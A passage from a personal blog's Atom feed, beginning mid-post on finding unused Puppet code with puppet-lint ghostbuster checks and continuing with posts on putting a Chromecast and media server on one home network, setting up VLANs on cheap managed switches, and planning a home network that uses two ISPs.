&lt;p&gt;find . -type f -name '*.pp' -exec puppet-lint --only-checks ghostbuster_classes,ghostbuster_defines,ghostbuster_facts,ghostbuster_files,ghostbuster_functions,ghostbuster_hiera_files,ghostbuster_templates,ghostbuster_types {} \+|grep OURMODULE&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Got some output! Are they correct?&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;./modules/OURMODULE/manifests/profile/apache.pp - WARNING: Class OURMODULE::Profile::Apache seems unused on line 6&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;But actually we have a role that contains:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;class { 'OURMODULE::profile::apache': }&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So I'm not sure what is up... But if I don't run all the ghostbuster and instead skip the ghostbuster_classes test I get a lot fewer warnings for our module.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/modules/OURMODULE/manifests/profile/keystone/user.pp - WARNING: Define OURMODULE::Profile::Keystone::User seems unused on line 2&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Looking in that one we have a "OURMODULE::profile::keystone::user" which calls keystone_user and keystone_user_role. However we do call it but like this:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;OURMODULE::Profile::Keystone::User&amp;lt;| title == 'barbican' |&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Or in this other place:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;create_resources(OURMODULE::profile::keystone::user, $users)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let's look at the next. which was also a "create_resources" . Meh. Same same. And if I skip the ghostbuster_defines? No errors :) Well it was worth a shot. Some googling on the topic hints that it might not be possible with the way puppet works.&lt;/p&gt;</content><category term="it"></category><category term="hiera"></category><category term="puppet"></category><category term="software"></category><category term="ssh"></category></entry><entry><title>Home Network Convergence</title><link href="/home-network-convergence.html" rel="alternate"></link><published>2019-07-14T00:00:00+03:00</published><updated>2019-07-14T00:00:00+03:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2019-07-14:/home-network-convergence.html</id><summary type="html">&lt;p&gt;Finally got around to sorting out an issue which basically was that the TV+Chromecast near the TV was on another network than the media server and thus I couldn't stream videos by using my phone.&lt;/p&gt;
&lt;p&gt;I've been thinking lately and in previous posts that maybe I should just get …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Finally got around to sorting out an issue which basically was that the TV+Chromecast near the TV was on another network than the media server and thus I couldn't stream videos by using my phone.&lt;/p&gt;
&lt;p&gt;I've been thinking lately and in previous posts that maybe I should just get an access point and plug it in a port in the correct VLAN near the TV, as mentioned in a previous posts in https://www.guldmyr.com/vlan-in-the-home-network/ or https://www.guldmyr.com/some-updates-to-the-home-network/&lt;/p&gt;
&lt;p&gt;But then the other day I started looking at maybe the raspberry Pi I have as a media player could be turned into an access point? (some googling suggest it could be done, but several talk about basic linux install with hostapd and dnsmasq which maybe openwrt would be more fun).&lt;/p&gt;
&lt;p&gt;Then I realized that I already have an access point over there which is what phones and the chromecast is connected to and I don't want a third wifi network at home!&lt;/p&gt;
&lt;p&gt;Finally the solution is to get the media server onto the same network as the chromecast. This I could now after the VLAN changes do quite easily.&lt;/p&gt;
&lt;p&gt;Steps: - take the desktop's cable and put it in a dumb 1GbE switch I had unused - new cable from my desktop's system board NIC to go same a switch - at this point ssh into media server from internet (because it has no monitor/keyboard) - add usb NIC to the media server and connect to the switch - setup static NIC without default gw etc - update firewalls&lt;/p&gt;
&lt;p&gt;Things learnt: - the USB NIC got a funny and long interface name when I plugged it in. On next reboot it got eth0. So the network interface config I wrote initially didn't really work anymore :)&lt;/p&gt;
&lt;p&gt;Feels good to not have to this this old and unmaintained media player on the raspberry pi anymore. The android app I use even supports EAC3!&lt;/p&gt;
&lt;p&gt;Next I'm wondering what to do with that raspberry pi! retropie maybe?&lt;/p&gt;</content><category term="it"></category><category term="chromecast"></category><category term="dnsmasq"></category><category term="hostapd"></category><category term="linux"></category><category term="media"></category><category term="server"></category><category term="openwrt"></category><category term="raspberry"></category><category term="pi"></category><category term="virtual"></category><category term="lan"></category><category term="wi"></category><category term="fi"></category><category term="wireless"></category><category term="access"></category><category term="point"></category></entry><entry><title>VLAN in the home network!</title><link href="/vlan-in-the-home-network.html" rel="alternate"></link><published>2019-05-30T00:00:00+03:00</published><updated>2019-05-30T00:00:00+03:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2019-05-30:/vlan-in-the-home-network.html</id><summary type="html">&lt;p&gt;https://www.guldmyr.com/some-updates-to-the-home-network/&lt;/p&gt;
&lt;p&gt;Above is a previous post in this series about some improvements to my home network. With two modems from two ISPs.&lt;/p&gt;
&lt;p&gt;So! On Alibaba I found two Hasivo &lt;a href="https://www.aliexpress.com/item/8-Port-Gigabit-Managed-Switch-Managed-Ethernet-Switch-with-8-port-10-100-1000M-VLAN/1000007360495.html"&gt;8x1GbE managed fanless switches&lt;/a&gt; with VLAN support. Delivery time to Finland was really quick. It didn't say …&lt;/p&gt;</summary><content type="html">&lt;p&gt;https://www.guldmyr.com/some-updates-to-the-home-network/&lt;/p&gt;
&lt;p&gt;Above is a previous post in this series about some improvements to my home network. With two modems from two ISPs.&lt;/p&gt;
&lt;p&gt;So! On Alibaba I found two Hasivo &lt;a href="https://www.aliexpress.com/item/8-Port-Gigabit-Managed-Switch-Managed-Ethernet-Switch-with-8-port-10-100-1000M-VLAN/1000007360495.html"&gt;8x1GbE managed fanless switches&lt;/a&gt; with VLAN support. Delivery time to Finland was really quick. It didn't say (ok, I didn't read all or ask seller) if they included European adapters but turns out they did!&lt;/p&gt;
&lt;p&gt;To recap: &lt;strong&gt;The idea was to use the one long cable and transport two VLANs over it. Other than that how I would actually implement it was a bit fuzzy.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="plan" src="images/home-net-current-20190516-2.jpg"&gt;&lt;/p&gt;
&lt;p&gt;New layout. Numbers in the switchlike boxes are VLAN ids&lt;/p&gt;
&lt;p&gt;Things I've learnt while connecting these:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Creating a VLAN subinterface in Windows 10 seems to require Hyper-V.. This means if I have one machine and want it in both VLANs I need two NICs. No bother, I found a USB3 1GbE adapter in a box at home when cleaning :)&lt;/li&gt;
&lt;li&gt;I knew about VLAN trunk cables, and the way they are implemented in this Web Interface is to set both VLANs as tagged on the same port.&lt;ul&gt;
&lt;li&gt;The web interface of this switch has two pages about VLANs. One is a static setup where you say which port is a member of which VLAN and if it's tagged or untagged. Changing the default or removing a port from VLAN 1 was not possible in this the first screen. In the second however one can change the PVID which is the untagged/native VLAN.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Also found a few extra short ethernet cables in old ISP modem boxes, very nice to have with this as this exercise required a few more cables.&lt;/li&gt;
&lt;li&gt;So on the desktop I now need to choose which network interface to use to get to the Internet. I learnt that if I just remove default gateway for IPv4 from ISP A and use the NIC to ISP B then IPv6 from ISP A will still be there and used :)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="config-in-sw-web-ui-1" src="images/static_vlan_setup.png"&gt;&lt;/p&gt;
&lt;p&gt;First VLAN config page: The static VLAN/tagged VLAN setup on the other page&lt;/p&gt;
&lt;p&gt;&lt;img alt="config-in-sw-web-ui-2" src="images/modemb_untagged.png"&gt;&lt;/p&gt;
&lt;p&gt;Second VLAN config page: The native VLAN / PVID configuration on one switch&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Some &lt;strong&gt;more bits about the switches is in order:&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;On a related note, the modems have switches builtin and I also had a 6 port fanless unmanaged switch which has been working great for the last 6 years or so but now that got deprecated, yay one less UK plug adapter :). I prefer using an extra switch as opposed to the modem's. The modems sometimes reboot which is annoying as it interrupts anything I'm doing, even if it's only local without going to the Internet.&lt;/p&gt;
&lt;p&gt;They have a very basic looking CGI web interface. The web interface is only accessible on VLAN 1. The firmware is from 2013 and has version v1.0.3, I asked the seller (which was very responsive to all of my questions) and apparently a newer one is in the works but unfortunately, there's no way to subscribe to any news about new firmware coming.. I doubt it'll ever come.  &lt;/p&gt;
&lt;p&gt;One switch-like quality was that to save the running configuration you make in the web interface, you have to click on save.&lt;/p&gt;
&lt;p&gt;There is a manual, one just had to ask the seller on Ali Baba for it :/&lt;/p&gt;
&lt;p&gt;All in all this worked out quite nicely. We'll see how this keeps up. Some further avenues of interest:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;On my desktop I now use the USB NIC to get to the internet, I tried once to use the system board NIC but then had some issues.. perhaps that's a bit faster. Using a USB 3 port vs a USB 2 port gave about half a millisecond faster latency to this place I usually ping.funet.fi&lt;/li&gt;
&lt;li&gt;Response time on the DSL is a bit higher (17 vs 12) to ping.funet.fi&lt;ul&gt;
&lt;li&gt;tracert shows 17ms to first hop with the DSL's ISP&lt;/li&gt;
&lt;li&gt;tracepath shows 10ms to first hop with the cable modem's ISP&lt;/li&gt;
&lt;li&gt;pinging the DSL modem is 1ms vs cable modem 3ms&lt;/li&gt;
&lt;li&gt;ping6 to ping.funet.fi is 10ms with DSL&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Maybe time to look into a cheap AP to plug in near ISP modem B but connected to VLAN 10 so wifi clients there can reach the server..&lt;/li&gt;
&lt;li&gt;The switches have a bunch of other settings that could be fun to play with too.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Was the layout diagram above not clear? Try this:&lt;/p&gt;
&lt;p&gt;&lt;img alt="after-with-colors!" src="https://lh5.googleusercontent.com/ZtYmLJgLMLOlWOvYaNZ47I7KnI0HwTrqWw8u9JlhxVgdJJpt7whfeeccwekT-OcJ_jTP2HqOqkV4Ry0fTd3VAB0YH7pGlcxlUatlWSzpSCFiYhLW2cgc3fDknkY0vJ9xn5fuXqHM"&gt;&lt;/p&gt;</content><category term="it"></category><category term="cable"></category><category term="firmware"></category><category term="home"></category><category term="network"></category><category term="hyper-v"></category><category term="internet"></category><category term="service"></category><category term="provider"></category><category term="modem"></category><category term="interface"></category><category term="controller"></category><category term="switch"></category><category term="usb3.0"></category><category term="user"></category><category term="virtual"></category><category term="lan"></category><category term="windows10"></category></entry><entry><title>Some updates to the home network 1/2</title><link href="/some-updates-to-the-home-network-12.html" rel="alternate"></link><published>2019-05-15T00:00:00+03:00</published><updated>2019-05-15T00:00:00+03:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2019-05-15:/some-updates-to-the-home-network-12.html</id><summary type="html">&lt;p&gt;Current layout:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Before" src="images/home-net-current-20190504-1.jpg"&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The corner:&lt;ul&gt;
&lt;li&gt;Cable MODEM NAT&amp;amp;WiFi ISP A&lt;/li&gt;
&lt;li&gt;One server&lt;/li&gt;
&lt;li&gt;One desktop who should be on both networks, default gw on one&lt;/li&gt;
&lt;li&gt;Phones and tablets wifi&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TV Area:&lt;ul&gt;
&lt;li&gt;DSL Modem NAT&amp;amp;WiFi ISP B&lt;/li&gt;
&lt;li&gt;One raspberry pi connected to the server&lt;/li&gt;
&lt;li&gt;Phones and tablets wifi&lt;/li&gt;
&lt;li&gt;One chromecast, would …&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;Current layout:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Before" src="images/home-net-current-20190504-1.jpg"&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The corner:&lt;ul&gt;
&lt;li&gt;Cable MODEM NAT&amp;amp;WiFi ISP A&lt;/li&gt;
&lt;li&gt;One server&lt;/li&gt;
&lt;li&gt;One desktop who should be on both networks, default gw on one&lt;/li&gt;
&lt;li&gt;Phones and tablets wifi&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TV Area:&lt;ul&gt;
&lt;li&gt;DSL Modem NAT&amp;amp;WiFi ISP B&lt;/li&gt;
&lt;li&gt;One raspberry pi connected to the server&lt;/li&gt;
&lt;li&gt;Phones and tablets wifi&lt;/li&gt;
&lt;li&gt;One chromecast, would be nice to have connected to the server too&lt;/li&gt;
&lt;li&gt;One ps3&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;20m, a microwave, and walls in between the two areas (and most importantly the server and the raspberry pi) so wifi is spotty.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Most import factor: &lt;strong&gt;One long ass 30m UTP cable connecting the raspberry pi to the same network as the server&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;It would be cool to: &lt;strong&gt;A)&lt;/strong&gt; be able to connect the desktop to the modem out by the TV and &lt;strong&gt;B)&lt;/strong&gt; Get the chromecast (WIFI only) onto the same network as the server, perhaps with an AP for ISP A network near the TV area&lt;/p&gt;
&lt;p&gt;Stay tuned for another post in the hopefully near future when I've got something working to help with A/B :)&lt;/p&gt;
&lt;p&gt;Update : another graphical representation of the networks:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Before-with-colors" src="https://lh5.googleusercontent.com/aUuKseUdXT87v4A5lfBYPcyAykhygf2_5MJGveTSKEvzgmOh509-6_NA2gALnRQ5YEXAQqNp4Sh2_PLcrYEyh3LVVemDXLXwFFDBAz3-ii-n7drfh5TezQd9Y7GF131WFnKFYN-M"&gt;&lt;/p&gt;</content><category term="it"></category><category term="cable"></category><category term="modem"></category><category term="home"></category><category term="network"></category><category term="isp"></category><category term="nat"></category><category term="ps3"></category><category term="raspberry"></category><category term="pi"></category><category term="server"></category><category term="computing"></category><category term="vlan"></category><category term="wi"></category><category term="fi"></category><category term="wifi"></category></entry></feed>